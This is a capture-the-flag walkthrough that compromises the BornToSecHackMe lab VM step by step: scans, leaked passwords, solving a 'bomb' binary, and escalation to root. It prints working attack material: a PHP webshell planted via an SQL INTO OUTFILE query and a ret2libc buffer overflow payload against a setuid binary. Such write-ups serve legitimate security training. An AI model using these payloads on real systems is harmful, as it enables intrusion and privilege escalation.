# Writeup 1 - The treasure hunt way

## Writeups Map

![Imgur](https://i.imgur.com/gb4HAhr.png)

## Summary

- [1. Finding the IP](#1-finding-the-ip)
- [2. Looking for running services](#2-looking-for-running-services)
- [3. Fuzzing access paths](#3-fuzzing-access-paths)
- [4. Inspecting the forum](#4-inspecting-the-forum)
- [5. Logging into the forum](#5-logging-into-the-forum)
- [6.2 Logging into the webmail](#62-logging-into-the-webmail)
- [7. Logging into Phpmyadmin](#7-logging-into-phpmyadmin)
- [8.2 Injecting a webshell](#82-injecting-a-webshell)
- [9. Getting a FTP access](#92-getting-a-ftp-access)
- [10.2 Getting SSH access as laurie](#102-getting-ssh-access-as-laurie)
- [11.2 Getting SSH access as thor](#112-getting-ssh-access-as-thor)
- [12. Getting SSH access as zaz](#12-getting-ssh-access-as-zaz)
- [14.3 Ret2LibC](#144-ret2libc)

## Exploitation

### 1. Finding the IP

> Please note that this section may differ depending on your network configuration.

I have setup the VM in bridged network mode which means it has it's own ip on my local network

First we get our network address

```text
PS C:\Users\user> ipconfig
Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Adresse IPv6. . . . . . . . . . . . . .: 2a04:cec0:10f7:c1d1:83b9:f706:901f:e740
   Adresse IPv6 temporaire . . . . . . . .: 2a04:cec0:10f7:c1d1:6919:2648:8564:bd77
   Adresse IPv6 de liaison locale. . . . .: fe80::9b0e:c803:3db7:d80c%17
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.140.56
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . : fe80::24a7:dbff:fec2:243%17
                                       192.168.140.206
```

In this case the network ip and mask are `192.168.140.0/24`

First we use `nmap -sn` to scan the network for all hosts

```text
nmap -sn 192.168.140.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 17:35 CEST
Nmap scan report for 192.168.140.112
Host is up (0.0012s latency).
Nmap scan report for 192.168.140.206
Host is up (0.0066s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 43.33 seconds
```

We get two hosts, one is `192.168.140.206` which is the address present in the `ipconfig`, the other one is the VM

### 2. Looking for running services

Let's scan this ip with `nmap`

```text
nmap 192.168.140.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 18:18 CEST
Nmap scan report for 192.168.140.112
Host is up (0.00032s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

### 3. Fuzzing access paths

Ports 80 and 443 are open which means a website is present on the machine, let's fuzz it with `dirb`

```text
dirb https://192.168.140.112

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed May 29 18:20:23 2024
URL_BASE: https://192.168.140.112/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.140.112/ ----
+ https://192.168.140.112/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.140.112/forum/
==> DIRECTORY: https://192.168.140.112/phpmyadmin/
+ https://192.168.140.112/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.140.112/webmail/

...
```

Let's access those links with our web browser

### 4. Inspecting the forum

Here is `https://192.168.140.112/forum`

![Imgur](https://i.imgur.com/9QEQoCv.png)

After close inspection the `Problem login` topic is a log file containing what looks to be login credentials

```text
...
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
...
```

These credentials allows us to connect to the forum as the user `lmezard`

### 5. Logging into the forum

> login: `lmezard`
>
> password: `!q\]Ej?*5K5cy*AJ`

After loggin in we get access to the user's profile which gives us an email

![Imgur](https://i.imgur.com/WFjQWXt.png)

We can try using this email and the password to access the webmail or get a SSH access

> From this step you can continue to all the following steps
>
> - [6.1 Getting SSH access as laurie@borntosec](#61-getting-ssh-access-as-laurieborntosec)
> - [6.2 Logging into the webmail](#62-logging-into-the-webmail)

### 6.1 Getting SSH access as laurie@borntosec

> login: `laurie@borntosec.net`
> password: `!q\]Ej?*5K5cy*AJ`

You can use the same credentials as the webmail to get a SSH access into the machine

> From this step you can continue to all the following steps
>
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)
> - [14.1 Using fakeroot](./Writeup7.md#141-using-fakeroot)

### 6.2 Logging into the webmail

> login: `laurie@borntosec.net`
>
> password: `!q\]Ej?*5K5cy*AJ`

After loggin in we get access to two mails

![Imgur](https://i.imgur.com/0Tu8PpH.png)

The `DB Access` mail contains login credentials

```text
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

### 7. Logging into Phpmyadmin

> login: `root`
>
> password: `Fg-'kKXBj87E:aJ$`

After login into Phpmyadmin we get a full `root` access to all DBs in the service

![Imgur](https://i.imgur.com/nijo5Hj.png)

Now we will try to get a `shell` to the machine by injecting a new `php` page into the forum that will execute the commands we give it

> From this step you can continue to all the following steps
>
> - [8.1 Injecting a reverse shell](./Writeup3.md#81-injecting-a-reverse-shell)
> - [8.2 Injecting a webshell](#82-injecting-a-webshell)
> - [8.3 Exploiting suExec](./Writeup2#83-exploiting-suexec)

### 8.2 Injecting a webshell

We will use a SQL command to create a new file inside the forum pages directory

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'FORUM_LOCATION/PAGE_LOCATION'
```

First we have to find the `FORUM_LOCATION` and `PAGE_LOCATION` to create the new page

Knowing the forum is using Apache, the app location is usually `/var/www`

Using `dirb` we can scan the forum for directories

```text
dirb https://192.168.140.112/forum

---- Scanning URL: https://192.168.140.112/forum/ ----
+ https://192.168.140.112/forum/backup (CODE:403|SIZE:295)
+ https://192.168.140.112/forum/config (CODE:403|SIZE:295)
==> DIRECTORY: https://192.168.140.112/forum/images/
==> DIRECTORY: https://192.168.140.112/forum/includes/
+ https://192.168.140.112/forum/index (CODE:200|SIZE:4984)
+ https://192.168.140.112/forum/index.php (CODE:200|SIZE:4984)
==> DIRECTORY: https://192.168.140.112/forum/js/
==> DIRECTORY: https://192.168.140.112/forum/lang/
==> DIRECTORY: https://192.168.140.112/forum/modules/
==> DIRECTORY: https://192.168.140.112/forum/templates_c/
==> DIRECTORY: https://192.168.140.112/forum/themes/
==> DIRECTORY: https://192.168.140.112/forum/update/
```

Now we can try uploading the `shell.php` file on each directory using the command in `Phpmyadmin`

It only worked in `/forum/templaces_c` the full command will be

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```

![Imgur](https://i.imgur.com/WQTxCBU.png)

Now we can use this script as a webshell passing `cmd=COMMAND_TO_EXECUTE` as argument

![Imgur](https://i.imgur.com/f1uJEy6.png)

### 9.1 Getting a Terminal access as www-data

> All the following steps can lead here:
>
> - [8.1 Injecting a reverse shell](./Writeup3.md#81-injecting-a-reverse-shell)
> - [8.2 Injecting a webshell](#82-injecting-a-webshell)

Now that we have a terminal-like access as the user www-data we can use it in multiple ways, in this writeup we will focus on the treasure hunt way

> From this step you can continue to all the following steps
>
> - [9.2 Getting a FTP access](#92-getting-a-ftp-access)
> - [13 Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)
> - [14.1 Use fakeroot](./Writeup7.md#141-using-fakeroot)

### 9.2 Getting a FTP access

> All the following steps can lead here:
>
> - [8.3 Exploiting suExec](./Writeup2.md#83-exploiting-suexec)
> - [9.1 Getting a Terminal access as www-data](#91-getting-a-terminal-access-as-www-data)

Now that we have a shell access as user `www-data`, we will look into the machine to find usefull information

Starting in `/home/` we can see multiple users

![Imgur](https://i.imgur.com/9A92ko1.png)

We have `read` permissions only on the `/home/LOOKATME` directory

It contains a single file `password` with the following content

```text
lmezard:G!@M6f4Eatau{sF"
```

This looks like credentials, we can use them to connect to the FTP 

> login: `lmezard`
>
> password: `G!@M6f4Eatau{sF"`

![Imgur](https://i.imgur.com/dKhMw9p.png)

We have two files in the FTP server, `fun` and `README`

`README` contains some instructions

```text
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

`fun` is an archive comtaining multiple .pcap files but despite the extension those files are just text files

Each one contains a piece of C code and a comment with the file number

After compiling all the pieces of code we get this password:

```text
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

### 10.2 Getting SSH access as laurie

Once we're connected with ssh as Laurie, we find a binary called bomb. As stated in the readme, it will give us the password of the next user :

```text
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
2
b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

This bomb is composed of 6 phases. Each phare requires a password to access the next phase, and an invalid password will blow up the bomb.

#### Phase 1

Disassembling the binary, we find this function :

```c
int __cdecl phase_1(_BYTE *a1)
{
    int result; // eax

    result = strings_not_equal(a1, "Public speaking is very easy.");
    if ( result )
        explode_bomb();
    return result;
}
```

Here we have our password :

```text
Public speaking is very easy.
```

#### Phase 2

```c
int __cdecl phase_2(char *s)
{
    int i; // ebx
    int result; // eax

    read_six_numbers(s, (int)v3);
    if ( v3[0] != 1 )
        explode_bomb();
    for ( i = 1; i <= 5; ++i )
    {
        result = v3[i - 1] * (i + 1);
        if ( v3[i] != result )
            explode_bomb();
    }
    return result;
}
```

The second passord starts with 1, and the next number is result[i - 1] * (i + 1) for i <= 5

```text
result[0] = 1
result[1] = 1 * 2 = 2
result[2] = 2 * 3 = 6
result[3] = 6 * 4 = 24
result[4] = 24 * 5 = 120
result[5] = 120 * 6 = 720
```

The second password will be :

```text
1 2 6 24 120 720
```

#### Phase 3

Here we have a switch/case statement (see [phase3.c pseudocode](LIEN DU PSEUDOCODE))

The first input (v3) enters the corresponding switch/case statement (ex : 0 will lead to case 0)

The second input (v4) needs to be the value of v2 assigned in the above switch case statement (ex : case  0: v2 = 113 -> q in ascii)

The last input (v5) needs to be equal to the value in the if statement (ex : case 0 : v5 != 777)

There are multiple values possible for the password, for instance

```text
0 q 777
```

or

```text
21 b 214
```

We will have to try every single one of them for the final password.

#### Phase 4

This phase will calculate the fibonnaci sequence of the index given as an argument. The value needs to be 55. This value is obtained at the 10th index (index 9), so this is our password.

[pseudocode](LIEN DU PSEUDOCODE)

#### Phase 5

Looking at the [pseudocode](LIEN DU PSEUDOCODE), the password needs to be 6 characters long.

v3[i] is equal to array_123[index], the index being the last 4 bytes of a1[i].
v3 needs to contain the string "giants".
For instance v3[0] must be equal to 'g'.
We first need convert the values of array_123 to ASCII.
We see that g corresponds to index 15.
15 in binary is 1111. Since we only keep the last 4 digits of the value passed, we just need to find a character ending with 1111
Using this table : http://sticksandstones.kstrom.com/appen.html, we find 2 candidates : 'o' and 'O'
Rince and repeat for every other characters of "giants"

Once again, there are several alternatives, for instance the password could be :

```text
Opekma
```

or

```text
opeqmq
```

#### Phase 6

Here the understanding of the code is a bit harder. Looking at the [pseudocode](LIEN DU PSEUDOCODE), however, we can see that :

- There are 6 values
- The values must be bewteen 1 and 6
- There is no duplicate

Now, instead of using our brain cells and try to have a full understanding of the program, we can juste try every combination possible, since there are 6! = 720 combinations. That's a small number so it should be pretty fast.

Here is the bash script :

```bash
#!/bin/sh

python3 - <<EOF
import itertools

digits = '123456'
permutations = itertools.permutations(digits)
with open('permutations.txt', 'w') as f:
    for perm in permutations:
        f.write(' '.join(perm) + '\n')
EOF

STR="Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9\nOpekma\n"

while read -r permutation; do
    echo "$permutation" >> all.txt
    echo "$STR$permutation" | ./bomb >> all.txt
done < permutations.txt

awk '!/blown/{a[NR]=$0} /blown/{for(i=NR-11;i<=NR;i++)delete a[i]} END{for(i in a)print a[i]}' all.txt | awk '/1/ && /2/ && /3/ && /4/ && /5/ && /6/' 

rm all.txt permutations.txt
```

Once we run it :

```text
./exploit.sh
4 2 6 3 1 5
```

Here we have our password.

The thor password will then be:

```text
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

Because as the subject states, we need to swap the (n-1)th and (n-2)th characters of the password.

> From this step you can continue to all the following steps
>
> - [11.2 Getting SSH access as thor](#112-getting-ssh-access-as-thor)
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)

### 11.2 Getting SSH access as thor

Once we login as thor, we can find two text files in the home directory

README:

```text
thor@BornToSecHackMe:~$ cat README 
Finish this challenge and use the result as password for 'zaz' user.
```

and turtle:

```console
thor@BornToSecHackMe:~$ cat turtle
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
[...]
Avance 100 spaces
Recule 200 spaces
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces

Can you digest the message? :)
```

The name turtle is a reference to the python turtle module. This module allows to draw shapes using instructions given in a python program.

We need to convert the given instructions to a [python code](./scripts/turtle.py), and execute it.

This is the output:

![Imgur](https://i.imgur.com/zoJPY3u.png)

SLASH is written on the screen. But it's not the password for zaz.

The last line of the turtle text files sates 'Can you digest the message?'
This is a reference to MD5 (Message Digest algorithm). If we hash 'SLASH' :

```text
    echo -n "SLASH" | md5sum
    646da671ca01bb5d84dbb5fb2238dc8e
```

This is the password of the user zaz.

> From this step you can continue to all the following steps
>
> - [12. Getting SSH access as zaz](#12-getting-ssh-access-as-zaz)
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)

### 12. Getting SSH access as zaz

> All the following steps can lead here:
>
> - [11.2 Getting SSH access as thor](#91-getting-a-terminal-access-as-www-data)

A quick inspection of the home directory shows us a binary named "exploit_me" that will be executed as root.

```text
zaz@BornToSecHackMe:~$ ls -l
total 9
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
```

If we can manage to spawn a shell using this binary, we will have root permissions.
First of all, let's list all of the functions using GDB:

```text
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482b4  _init
0x08048300  strcpy
0x08048300  strcpy@plt
0x08048310  puts
0x08048310  puts@plt
0x08048320  __gmon_start__
0x08048320  __gmon_start__@plt
0x08048330  __libc_start_main
0x08048330  __libc_start_main@plt
0x08048340  _start
0x08048370  __do_global_dtors_aux
0x080483d0  frame_dummy
0x080483f4  main
0x08048440  __libc_csu_init
0x080484b0  __libc_csu_fini
0x080484b2  __i686.get_pc_thunk.bx
0x080484c0  __do_global_ctors_aux
0x080484ec  _fini
```

Only a main() function. Let's have a look into it:

```text
//----- (080483F4) --------------------------------------------------------
int main(int argc, const char **argv, const char **envp)
{
  char dest[128];

  if ( argc <= 1 )
    return 1;
  strcpy(dest, argv[1]);
  puts(dest);
  return 0;
}
```

There is a vulnerable call to strcpy. Indeed, it copies argv[1] into the dest[] buffer. This buffer has a size of 128, meaning if we pass an argument with a size bigger than 128, we'll be in a case of stack overflow. 

At first, we need to find out if we can overflow EIP (instruction pointer register). To do so, we'll use a specific pattern.

```text
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) i r
eax            0x00
ecx            0xffffffff-1
edx            0xb7fd28b8-1208145736
ebx            0xb7fd0ff4-1208152076
esp            0xbffff6900xbffff690
ebp            0x654135650x65413565
esi            0x00
edi            0x00
eip            0x376541360x37654136
eflags         0x210282[ SF IF RF ID ]
cs             0x73115
ss             0x7b123
ds             0x7b123
es             0x7b123
fs             0x00
gs             0x3351
```

As we can see, EIP has sucessfully been overwritten. The register value 37654136 corresponds to the 140th - 143rd characters.

> From this step you can continue to all the following steps
>
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)
> - [14.3 Buffer overflow the setuid binary](./Writeup4.md#143-buffer-overflow-the-setuid-binary)
> - [14.4 Ret2LibC](#144-ret2libc)

### 14.4 Ret2LibC

> All the following steps can lead here:
>
> - [12. Getting SSH access as zaz](./Writeup1.md#12-getting-ssh-access-as-zaz)

![Imgur](https://i.imgur.com/nAS93lH.jpg)

Here we'll use the ret-to-libc technique to change the binary's execution flow by re-using existing executable code from the C standard library shared object that is already loaded and mapped into the program's virtual memory space. The return address will be overwritten with a memory address that points to the system() libc function, and we'll pass /bin/sh as the argument in order to spawn a shell. 

We need to find the addresses of system(), exit() and /bin/sh :

```text
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) info proc map
process 2160
Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
0xb7e2b000 0xb7e2c000     0x1000        0x0 
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
0xb7fd2000 0xb7fd5000     0x3000        0x0 
0xb7fda000 0xb7fdd000     0x3000        0x0 
0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

We've got all that we need. We can now craft our payload. Here's the general look:

payload = padding + address of system() + return address of system() + address of "/bin/sh"

In our case, we'll have (addresses in little-endian architecture):

```text
"A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"
```

Let's run it :

```text
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
# whoami
root
```
